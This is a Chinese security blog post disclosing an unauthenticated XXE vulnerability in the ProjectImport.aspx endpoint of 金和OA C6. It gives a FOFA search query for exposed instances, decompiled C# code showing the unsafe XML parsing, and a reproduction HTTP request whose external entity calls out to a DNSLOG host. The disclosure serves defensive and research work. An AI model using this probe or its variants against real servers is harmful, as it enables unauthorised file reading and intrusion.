---
title: "金和OA ProjectImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html
asset_dir: assets/金和oa-projectimport.aspx-xxe漏洞
---

# 金和OA ProjectImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/7 13:31
- 286浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

服务器

数据库

SQL

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ProjectImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ProjectImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **ProjectImport** 的处理逻辑

深入探索

Nessus

计算机安全

网络安全课程

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

深入探索

文本剥离工具

恶意软件分析工具

Web安全书籍

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/ProjectImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ProjectImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALPUlEQVR4Aeybi5LbthJEdfL//+yb2a5DEUNA5NrOSlWXW4Gb048hhKH2Zeefx+Px63fWr5OPVc+T2GEv3b/qW3z39ro8tVZ8abVWeuetK1Or18V9d9VA/s3c/33KCWwD+Xe6jyurbxx4AJ3eeinYG/jyw4jdt/LL658hpHfXzMJc1w+j3nMQHYLmOpo7w31uG8ievK/fdwKHgUCmDiOutuj0YfRD6p7T33lrSA6C3Q9z3nzhKgPJlme2zIl6IDl5Uf0MIXkYcZY7DGRmurmfO4G/NpD+1PTalwR5Sqw79hyM/q73fNWQDAR7xhrmOoSvXrW6v7j9Ut9zv3v91wbyuxu4c+MJ/LWBQJ4qnxYYa2+rLspD/NbqojzEB0H5Qjhyxbt6L3lIDoIrX+d7bb8/wb82kD/ZxJ19nsBhIE694zMyXsH4VAEP/l26ILq1COG9T+chOgTVRXMz7B5IDwh2vdcw+iA1jGjuDGd7LG6WOwxkZrq5nzuBbSAwTh/m9dWt1RNQq/shfUurBWOtv7Raq1oekgekllj9agFfvy1YGhdCZWt1Geb9IDy8xn2/bSB78r5+3wn8UxP/nfXdLUOeEu/1u/mes19h1+B794S5v3rXgujeB8Zavry/u+53iKf4IXg6EMhTAHP0SeivB+LvOoSHYM9ZQ3TzYtchPniinp65ykN66YfUq376RIgfgvId4aifDqQ3uev/9gT+gXFKkBqC3t6noyO89pnveLUPpD8Ee+5V7T0h2V7DnLcnjLr5jiv/iof0Vd/3u98h+9P4gOttIJCpne0J4oNgnzKEtw+k1idCeH3yIhz0r7+FhJE3/wrPeqqveqhD7m0trnIw+le+Pb8NZE/e1+87ge3nkL4Fpy/COG15czDq8vogeuetIToEzYkw8ub2CPHsuf21vUQY/fL7TF3D6IN53fPWMPqr535BdOBxv0Men/WxHAg8pwZ8ff6uiUP4/jJKqwXRYcTSasHI26e0/YL4um4tQnyA1AGBr99dQfBgaATE536Uey0vwjyn3hHi3/PLgexN9/XPncDlgUCmefaUrHRI3pemD0YeUq908zD6yq8mQjzWHStTSx7iL64WpFZfYXlrqcOYK60WzPnSXJcH4s1u/G9P4DAQJ+Vtew2ZMoyo/wztB8nrh+/V9jFfKAdjr9Jqqdd1LZj7SqulX4TRD2Otr7K1IDoEi6ulD0a+tMNAirzX+05g+bus1RTl3XKv5cWuQ54K+Y6rnLwI6QNH7D2tzYpf/K/6B/dheg1j77jWf0L89hFN9Fp+j/c7ZH8aH3C9/aTu9ESYTxvCr/YOc92+5iA+CMrrg5FXhzmvXgjxwBzL82pBciuPe1zp8DrfcxA/cP+k/viwj8OnLMi03CekhuDZ06Eu9j6d77X+FX7Hf9ULeW0Q7Pe2j6h+Vq98kPuY3+NhIDa58T0nsA0E5lNzW04RRp+6CNEhKC9CePvJn2H3W++x94DcS14vzHl94sqvLsK8H4SHEc3NcBvITLy5nz+BbSBXnwZ9fauQp2Cly4vmIbled5+6CGOueDNicbXOahh76YfwvYbwEKx71IKxLm6/7CMH8cMTt4FouvG9J7ANBDIlpwhj7TYhPATlzfUaRh+MtTkIf1ZDfN5njzDX4Brvvfc96xqSV+9YnlrywNffv1iXVgvSp673S1/hNpC94b5+3wmc/i6rb62mWEsexqnDWJe3lv6OMPrVK1MLXuv69wjzDMx5szDqdf9aXYe5D0Yexto+1XO/5Avvd0idwgetw0CcnHuETBlGVF8hxN/13r/rcC0H8cETe6+ze6mLPW+tLsrD896A9BLNA19fY2bGw0Bmppv7uRM4/LbXW8M4Rafb8cwPYx/9ov2u1t1nfo96YLy3npXeeUgeguortH/HlR/SF554v0NWp/Um/tvfZUGm2ffrU9H5XkPyEFS/mtcvQvoAUhv2nsDX524IaoSxlu8I8fW+K99Vfu+73yH70/iA63sgHzCE/Ra2L+qQt+NenF2v3q6QvDrMa3vqs4b4rUWY8+r2KZS7ipWp1f3FzZY+yJ70yIsrXl2c+e53iKfzIbh9UXdaYt8f5KmAEfWZg+i97j5riN9ahDnfdYgPntg97kX+rNYHz57w/AfnXe81jDn1fl+IT77wfod4Wh+Ch68hkKn1/dX0Xi1ITg+Mdedh1Ff3k4e53757NCMHYxZS64N5bV6fKC923lrsPvkZ3u+Q2am8kdsG4hRF99RrGJ+m7oO5DuF7P/MdIX75nrOG+ACth/+5SO9mOLnQD3z9INntMPL69fUaXvvNFW4DqeJe7z+B7bus1VZgPl0YeRhr+0F4nxoYa31d77y1COljXQhHrvj/esH8vr4mEUZf54H7n5I+Puzj8F2W+4NxmpAagk5Xv7UoL4K5X1+f4+VX2PtA8hBU32PvpQbJqK94dVGfdUdI3+/6IDn7mS+8v4Z4Kh+C29eQmk4t91XXtazF4mrBOGUYa/0dIT4Idr1614LoEOy+KzXMsxC+7jNbEB2CeryntSgvQnIQlO8IR/1+h/RTenN9+jXEp0CE41T3rwFG3ZweaxHihxG7v9cw+uH5uyaItsrId4Tk3NtKh/hWes/3epUD7u+yHh/2sX0NcV+Q6TtVSK0ubw3R5Tvq6wjJya9yEJ/6yl+6mlhcLRh7FFcLwuvvWJ5a8nVdy1qE9Cmtlnxd14LoEOx6eVz31xBP50NwORDINJ0cpIag+z/T9Ykw5s949Y4w79N9V2p43QuiQ9CekNozkO+oLnZ9Xy8Hsjfd1z93Att3WU5PXG1BXYQ8JSv/Vd5++nsNuQ8E9YmFEK1nS6sF0eu61spXWi147V/lYcxVr6vrfodcPakf8h0GAuN0IbVPA6Re7U+fOox+9Y4QHwTNd+y5va4mB+klL0J4faK6dUeY5yA8BO0Dqe0DY9154P455PFhH4efQ5xuR/ctb/1dhPlT0vvA6Ov3hVHf5yGaGUgNwc6bhejW+lY1xK9P7H6Y++DIHz5l2ezG95zA9l0WZFqrbUB0GFF/fzrkxat69/Uacn/7Qmp4ohkIZ90z1uqiPCS/quVXCMmv+na++tzvkDqFD1qHgUCmCkH36jRFeRFGv3z391ofjHl9EB6C8q/Qnnog2c5bQ3QYUV20X0dITh/Ma3jNA/d3WY8P+zh8l+X+fAqsRRinrE+E6BA0t0KIb5WXFyF+uI793pCsPbv+5LuSGpJP9fwT5vzTkatX/Q+fshK5/3zXCWzfZTk1cbUhdRHmT0XX4bVvdb8Vb/8Z9kz3XNV7DsbXAGPd/db9ftbqe7zfIZ7Oh+D2NQQybbiGff+QnNOGsdYP4WFEdfPWIsRvLUJ4QGqJwNe/1V3dwyDEB0F50bwoL8I8d0W/3yGe0ofgNhCnfYbf3TeMT4v9r/aB5Fc5+cKznuWpBempH8a6PPsFow6pIWgf0ay12HlIHp64DcTQje89gcNA4DkteF5/d5s+DeJZHp73Ag524OvzvwKkhiPq+V2Esad9fC0d1WHMQequW4v7foeBaLrxPSfwxwPZT7eufRkwPh2l1YLwdX1l2a/jLKtHzRpyT2t1CG/d9VUNyXW99+m6tT4R0g+4f5f1+LCPP36H9NcDmXaf/srXeWtIH2v7ifJ7XGmdh7E3pIbgvud3ruFaHkaf+yv86wP5zgu4vccTOAykpjRbx+icMQvjUwBj3X0w170LRIeg/B5h1LzH3rO/7nqv9UL6QrDz1uZFeRhzr/jDQDTf+J4T2AYCmSK8xtU2Ycx1X39q1Fe8esdX/pUG2Vvv1WuID4Jdt7+oDvFDUL5jz6lDcsD9Xdbjwz62d8iH7ev/djv/AwAA//8vdHSZAAAABklEQVQDAKDsp8LP3dIdAAAAAElFTkSuQmCC)

手机扫码阅读

漏洞预警服务
